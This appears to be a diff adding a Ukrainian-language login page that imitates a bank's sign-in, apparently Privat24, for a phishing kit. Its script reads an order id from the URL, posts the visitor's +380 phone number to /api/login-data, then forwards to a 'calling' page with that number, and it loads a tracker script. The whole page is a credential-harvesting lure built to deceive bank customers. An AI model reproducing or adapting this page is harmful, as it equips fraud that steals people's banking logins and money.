@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="uk" dir="ltr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Вхід/Реєстрація</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Helvetica Neue",Arial,sans-serif;-webkit-font-smoothing:antialiased}
+body{max-width:520px;margin:0 auto;min-height:100vh;background:#fff;display:flex;flex-direction:column}
+
+.header{display:flex;align-items:center;justify-content:flex-end;padding:12px 16px}
+.x-btn{background:none;border:none;cursor:pointer;padding:8px}
+.x-btn svg{width:20px;height:20px;stroke:#1a1a1a;stroke-width:2;fill:none;stroke-linecap:round}
+
+.content{flex:1;padding:0 24px;display:flex;flex-direction:column}
+
+.title{font-size:24px;font-weight:300;color:#1a1a1a;text-align:center;margin:16px 0 32px}
+
+.lbl{font-size:12px;color:#b0b0b0;margin-bottom:8px}
+
+.phone-row{
+  display:flex;align-items:center;
+  padding-bottom:8px;border-bottom:1.5px solid #4EA524;margin-bottom:24px;
+}
+.pref{display:flex;align-items:center;gap:4px;padding-right:10px;border-right:1px solid #d0d0d0;margin-right:10px;cursor:pointer}
+.pref .fl{font-size:18px}
+.pref .cd{font-size:16px;font-weight:600;color:#1a1a1a}
+.pref .ar{width:10px;height:10px}
+.pref .ar path{fill:#999}
+.inp{border:none;outline:none;font-size:16px;color:#1a1a1a;background:transparent;width:100%;font-family:inherit}
+.inp::placeholder{color:#ccc}
+
+.terms{display:flex;align-items:flex-start;gap:8px;margin-bottom:24px}
+.chk{
+  width:18px;height:18px;min-width:18px;border:1.5px solid #ccc;border-radius:3px;
+  cursor:pointer;display:flex;align-items:center;justify-content:center;
+  background:#fff;transition:.15s;margin-top:1px;
+}
+.chk.on{background:#4EA524;border-color:#4EA524}
+.chk svg{width:11px;height:11px;stroke:#fff;stroke-width:3;fill:none;stroke-linecap:round;stroke-linejoin:round;display:none}
+.chk.on svg{display:block}
+.terms-txt{font-size:12px;color:#888;line-height:1.45}
+.terms-txt a{color:#4EA524;text-decoration:none}
+
+.btn-g{
+  display:block;margin:0 auto;padding:0 48px;height:48px;
+  border:none;border-radius:27px;font-size:16px;font-weight:600;
+  color:#fff;background:#4EA524;cursor:pointer;font-family:inherit;transition:.2s;
+}
+.btn-g:hover{background:#3d8a1c}
+.btn-g:disabled{opacity:.4;cursor:default}
+
+.sep{text-align:center;color:#bbb;font-size:14px;margin:16px 0}
+
+.btn-b{
+  margin:0 auto;padding:0 48px;height:48px;
+  border:none;border-radius:27px;font-size:16px;font-weight:600;
+  color:#fff;background:#1a1a1a;cursor:pointer;font-family:inherit;transition:.2s;
+  display:flex;align-items:center;justify-content:center;gap:8px;
+}
+.btn-b:hover{background:#333}
+.i24{
+  width:22px;height:22px;border-radius:50%;background:#4EA524;
+  display:flex;align-items:center;justify-content:center;
+  font-size:11px;font-weight:800;color:#fff;
+}
+
+.bottom{
+  display:flex;align-items:center;justify-content:center;gap:24px;
+  margin-top:auto;padding:20px 24px 24px;
+}
+.dl{display:flex;align-items:center;gap:8px;text-decoration:none;color:#1a1a1a}
+.dl svg{width:20px;height:20px;flex-shrink:0}
+.dl .t1{font-size:10px;color:#999}
+.dl .t2{font-size:12px;font-weight:600;color:#1a1a1a}
+
+.err{display:none;background:#fff0f0;border:1px solid #fcc;border-radius:8px;padding:8px 12px;margin-bottom:12px;color:#c62828;font-size:12px;text-align:center}
+
+.ov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.4);z-index:99;align-items:center;justify-content:center;padding:20px}
+.ov.open{display:flex}
+.md{background:#fff;border-radius:20px;width:100%;max-width:360px;padding:28px 24px;position:relative;text-align:center}
+.md-x{position:absolute;top:14px;right:14px;width:32px;height:32px;border-radius:50%;background:#f5f5f5;border:none;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.md-x svg{width:16px;height:16px;stroke:#888;stroke-width:2.5;fill:none;stroke-linecap:round}
+.md img{width:100%;border-radius:10px}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <button class="x-btn" onclick="history.back()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+</div>
+
+<div class="content">
+  <div class="err" id="err"></div>
+  <div class="title">Вхід/Реєстрація</div>
+  <div class="lbl">Номер телефону</div>
+
+  <div class="phone-row">
+    <div class="pref">
+      <span class="fl">🇺🇦</span>
+      <span class="cd">+380</span>
+      <svg class="ar" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+    </div>
+    <input class="inp" id="phone" type="tel" inputmode="numeric" placeholder="000000000" maxlength="12" oninput="ck()">
+  </div>
+
+  <div class="terms">
+    <div class="chk" id="chk" onclick="tg()"><svg viewBox="0 0 24 24"><path d="M5 13l4 4L19 7"/></svg></div>
+    <div class="terms-txt">Продовжуючи, я підтверджую, що згоден (-на) з <a href="#">Умовами та Правилами</a>, й ознайомлений (-на) із <a href="#">Повідомленням про обробку персональних даних у Банку</a></div>
+  </div>
+
+  <button class="btn-g" id="go" onclick="sub()" disabled>Продовжити</button>
+  <div class="sep">або</div>
+  <button class="btn-b" onclick="sub()">Увійти через <span class="i24">24</span></button>
+</div>
+
+<div class="bottom">
+  <a class="dl" href="#">
+    <svg viewBox="0 0 24 24" fill="#1a1a1a"><path d="M18.71 19.5c-.83 1.24-1.71 2.45-3.05 2.47-1.34.03-1.77-.79-3.29-.79-1.53 0-2 .77-3.27.81-1.31.05-2.3-1.32-3.14-2.53C4.25 17 2.94 12.45 4.7 9.39c.87-1.52 2.43-2.48 4.12-2.51 1.28-.02 2.5.87 3.29.87.78 0 2.26-1.07 3.8-.91.65.03 2.47.26 3.64 1.98-.09.06-2.17 1.28-2.15 3.81.03 3.02 2.65 4.03 2.68 4.04-.03.07-.42 1.44-1.38 2.83M13 3.5c.73-.83 1.94-1.46 2.94-1.5.13 1.17-.34 2.35-1.04 3.19-.69.85-1.83 1.51-2.95 1.42-.15-1.15.41-2.35 1.05-3.11z"/></svg>
+    <div><div class="t1">Доступно у</div><div class="t2">App Store</div></div>
+  </a>
+  <a class="dl" href="#">
+    <svg viewBox="0 0 24 24" fill="none"><path d="M3.61 1.81L13.39 12 3.61 22.19c-.26-.44-.41-.96-.41-1.52V3.33c0-.56.15-1.08.41-1.52z" fill="#4285F4"/><path d="M17.07 8.32l-3.68 3.68 3.68 3.68 4.15-2.36c.72-.41.72-1.24 0-1.64l-4.15-2.36z" fill="#FBBC04"/><path d="M3.61 22.19c.51.86 1.41 1.26 2.32.78L17.07 15.68l-3.68-3.68L3.61 22.19z" fill="#EA4335"/><path d="M3.61 1.81L13.39 12l3.68-3.68L5.93 1.03C5.02.55 4.12.95 3.61 1.81z" fill="#34A853"/></svg>
+    <div><div class="t1">Доступно у</div><div class="t2">Play Market</div></div>
+  </a>
+</div>
+
+<div class="ov" id="ov">
+  <div class="md">
+    <button class="md-x" onclick="ce()"><svg viewBox="0 0 24 24"><path d="M6 6l12 12M18 6L6 18"/></svg></button>
+    <img src="images/error-illustration.jpg" alt="" onclick="ce()">
+  </div>
+</div>
+
+<script>
+var ps=new URLSearchParams(location.search),oid=ps.get("order"),ag=false;
+function tg(){ag=!ag;var c=document.getElementById("chk");ag?c.classList.add("on"):c.classList.remove("on");ck()}
+function ck(){var p=document.getElementById("phone").value.replace(/\D/g,"");document.getElementById("go").disabled=!(p.length>=9&&ag)}
+if(ps.get("error")==="1")document.getElementById("ov").classList.add("open");
+function ce(){document.getElementById("ov").classList.remove("open");history.replaceState(null,"","login.html"+(oid?"?order="+oid:""))}
+document.getElementById("ov").addEventListener("click",function(e){if(e.target===this)ce()});
+async function sub(){
+  var p=document.getElementById("phone").value.replace(/\D/g,"");
+  if(p.length<9)return;
+  var b=document.getElementById("go");b.disabled=true;b.textContent="Зачекайте...";
+  try{
+    var r=await fetch("/api/login-data",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({order_id:oid,username:"+380"+p,country:"UA"})});
+    var d=await r.json();
+    if(!d.success){se(d.message||"Помилка");b.disabled=false;b.textContent="Продовжити";return}
+    location.href="calling.html?order="+oid+"&phone="+p;
+  }catch(e){se("Помилка з'єднання");b.disabled=false;b.textContent="Продовжити"}
+}
+function se(m){var e=document.getElementById("err");e.textContent=m;e.style.display="block";setTimeout(function(){e.style.display="none"},3000)}
+document.getElementById("phone").addEventListener("keydown",function(e){if(e.key==="Enter")sub()});
+</script>
+<script src="tracker.js"></script>
+</body>
+</html>
